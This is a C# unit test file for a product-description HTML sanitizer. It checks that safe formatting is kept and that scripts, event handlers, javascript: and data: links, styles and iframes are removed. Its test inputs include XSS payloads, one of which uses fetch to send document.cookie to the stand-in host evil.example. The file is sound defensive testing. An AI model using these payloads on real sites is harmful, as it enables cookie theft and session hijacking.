using HAMBOX.Modules.Catalog.Application.Services;

namespace HAMBOX.UnitTests.Catalog.Inventory;

public class ProductOptionDescriptionSanitizerTests
{
    [Fact]
    public void Sanitize_NullInput_ReturnsNull()
    {
        Assert.Null(ProductOptionDescriptionSanitizer.Sanitize(null));
    }

    [Fact]
    public void Sanitize_HarmlessFormatting_IsPreserved()
    {
        const string html = "<p>Works <strong>worldwide</strong>. No <em>regional</em> restrictions.</p><ul><li>One</li><li>Two</li></ul>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.Equal(html, result);
    }

    [Fact]
    public void Sanitize_Link_KeepsHrefOnly()
    {
        const string html = "<p>See <a href=\"https://example.com/terms\">terms</a>.</p>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.Contains("href=\"https://example.com/terms\"", result);
        Assert.Contains("terms", result);
    }

    [Fact]
    public void Sanitize_ScriptTag_IsRemovedEntirely()
    {
        const string html = "<p>Hello</p><script>alert('xss')</script>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.DoesNotContain("script", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Hello", result);
    }

    [Fact]
    public void Sanitize_EventHandlerAttribute_IsStripped()
    {
        const string html = "<p onclick=\"alert('xss')\">Click me</p>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.DoesNotContain("onclick", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Click me", result);
    }

    [Fact]
    public void Sanitize_JavascriptLink_IsRejected()
    {
        const string html = "<a href=\"javascript:alert(1)\">click</a>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.DoesNotContain("javascript:", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Sanitize_DataLink_IsRejected()
    {
        const string html = "<a href=\"data:text/html,<script>alert(1)</script>\">click</a>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.DoesNotContain("data:", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<script", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Sanitize_InlineStyleAttribute_IsStripped()
    {
        const string html = "<p style=\"background:url(javascript:alert(1))\">Hello</p>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.DoesNotContain("style=", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("javascript:", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Sanitize_DisallowedTag_IsUnwrappedButTextKept()
    {
        const string html = "<div><iframe src=\"https://evil.example\"></iframe><p>Safe text</p></div>";

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.DoesNotContain("iframe", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Safe text", result);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("<p></p>")]
    [InlineData("<script>alert(1)</script>")]
    public void Sanitize_SanitizesToNothing_ReturnsNull(string html)
    {
        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.Null(result);
    }

    [Fact]
    public void Sanitize_MaliciousHtml_CannotReachOutputAtAll()
    {
        const string html = """
            <p onmouseover="fetch('https://evil.example/steal?c='+document.cookie)">Argentina</p>
            <script>document.location='https://evil.example'</script>
            <img src=x onerror="alert(1)">
            <a href="javascript:void(document.location='https://evil.example')">link</a>
            <svg onload="alert(1)"></svg>
            """;

        var result = ProductOptionDescriptionSanitizer.Sanitize(html);

        Assert.NotNull(result);
        Assert.DoesNotContain("evil.example", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onmouseover", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onload", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("javascript:", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<script", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<svg", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Argentina", result);
    }
}
